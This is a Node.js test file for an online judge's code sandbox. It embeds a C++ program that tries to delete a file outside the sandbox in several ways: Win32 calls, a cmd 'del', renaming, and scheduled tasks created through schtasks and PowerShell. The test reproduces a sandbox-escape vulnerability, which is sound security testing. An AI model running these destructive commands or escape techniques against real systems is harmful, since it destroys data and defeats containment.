const { describe, it, before } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
require('./_testdb')('sandbox-attack');
const db = require('../database/db');
const sandbox = require('../sandbox/executor');

// 与 sandbox.test.js 保持一致：无 g++ / 无 sandbox_runner.exe 时跳过真实执行
const gpp = spawnSync('g++', ['--version'], { shell: process.platform === 'win32', stdio: 'ignore' });
const SKIP_NO_GPP = gpp.status === 0 ? false : '未检测到 g++，跳过真实编译测试';

const RUNNER_EXE = path.join(__dirname, '..', 'sandbox', 'sandbox_runner.exe');
const SKIP_NO_RUNNER = process.platform === 'win32' && !fs.existsSync(RUNNER_EXE)
  ? '未检测到 sandbox_runner.exe（Windows fail-closed），先运行 sandbox\\build.bat'
  : false;
const SKIP = SKIP_NO_GPP || SKIP_NO_RUNNER;

const TARGET_DIR = 'C:\\test';
const TARGET_FILE = path.join(TARGET_DIR, 'test.txt');

// 攻击载荷：多路径尝试删除沙箱外的目标文件，并把每步结果打到 stdout 便于排查
const ATTACK_CODE = `
#include <windows.h>
#include <cstdio>

int main() {
    const char* target = "C:\\\\test\\\\test.txt";

    // 1) Win32 API：直接请求 DELETE 权限
    BOOL ok = DeleteFileA(target);
    printf("DeleteFileA ok=%d err=%lu\\n", ok ? 1 : 0, (unsigned long)(ok ? 0 : GetLastError()));

    // 2) CRT remove()
    int rc = remove(target);
    printf("remove rc=%d\\n", rc);

    // 3) 派生 cmd 进程执行 del
    int sys = system("cmd /c del /f /q \\"C:\\\\test\\\\test.txt\\" >NUL 2>&1");
    printf("system rc=%d\\n", sys);

    // 4) 回收站/重命名等旁路
    BOOL mv = MoveFileExA(target, "C:\\\\test\\\\test.bak", MOVEFILE_REPLACE_EXISTING);
    printf("MoveFileExA ok=%d err=%lu\\n", mv ? 1 : 0, (unsigned long)(mv ? 0 : GetLastError()));

    // 5) 计划任务（schtasks）：把删除动作交给沙箱外的任务计划程序执行
    const char* schCreate =
        "schtasks /create /tn NoldOJ_SandboxAttack /tr \\"cmd.exe /c del /f /q C:\\\\test\\\\test.txt\\" "
        "/sc once /st 23:59 /f";
    printf("schtasks create rc=%d\\n", system(schCreate));
    printf("schtasks run rc=%d\\n", system("schtasks /run /tn NoldOJ_SandboxAttack"));
    Sleep(3000);
    printf("schtasks query rc=%d\\n", system("schtasks /query /tn NoldOJ_SandboxAttack >NUL 2>&1"));
    printf("schtasks delete rc=%d\\n", system("schtasks /delete /tn NoldOJ_SandboxAttack /f >NUL 2>&1"));

    // 6) 计划任务（PowerShell Register-ScheduledTask，走 COM ITaskService）
    const char* psCreate =
        "powershell -NoProfile -NonInteractive -Command \\"Register-ScheduledTask -TaskName NoldOJ_SandboxAttackPS "
        "-Action (New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c del /f /q C:\\\\test\\\\test.txt') "
        "-Trigger (New-ScheduledTaskTrigger -Once -At 23:59) -Force\\"";
    printf("ps register rc=%d\\n", system(psCreate));
    printf("ps start rc=%d\\n", system("powershell -NoProfile -NonInteractive -Command \\"Start-ScheduledTask -TaskName NoldOJ_SandboxAttackPS\\""));
    Sleep(3000);
    printf("ps unregister rc=%d\\n", system("powershell -NoProfile -NonInteractive -Command \\"Unregister-ScheduledTask -TaskName NoldOJ_SandboxAttackPS -Confirm:$false\\""));

    // 7) 确认是否仍存在
    FILE* f = fopen(target, "rb");
    printf("exists=%d\\n", f ? 1 : 0);
    if (f) fclose(f);
    return 0;
}
`;

describe('沙箱越权删除攻击用例', () => {
  before(async () => {
    await db.initDB();
  });

  it('攻击程序成功删除 C:\\test\\test.txt 即通过（复现沙箱越权删除）', { skip: SKIP }, async (t) => {
    // 每次执行前重建目标文件；没有 C: 根目录写权限（未提权）时跳过
    try {
      fs.mkdirSync(TARGET_DIR, { recursive: true });
      fs.writeFileSync(TARGET_FILE, 'sandbox attack target\n', 'utf8');
    } catch (e) {
      t.skip(`无法创建 ${TARGET_FILE}（需要管理员权限）：${e.code || e.message}`);
      return;
    }

    const prep = sandbox.prepareWorkDir('cpp', ATTACK_CODE);
    try {
      const compRes = sandbox.compile(prep.workDir, prep.srcFile, prep.exeFile, prep.lang, prep.isWindows, false);
      assert.ok(compRes.success, `攻击程序编译应当成功: ${compRes.output}`);

      const runRes = await sandbox.runCode(prep.workDir, prep.srcFile, prep.exeFile, prep.lang, '', 20000, 256, prep.isWindows, 'standard');

      const deleted = !fs.existsSync(TARGET_FILE);
      assert.equal(
        deleted,
        true,
        `沙箱拦截了越权删除：${TARGET_FILE} 仍存在，漏洞未复现。\n` +
        `exitCode=${runRes.exitCode} signal=${runRes.signal}\nstdout:\n${runRes.stdout}\nstderr:\n${runRes.stderr}`
      );
    } finally {
      sandbox.cleanupWorkDir(prep.workDir);
    }
  });
});
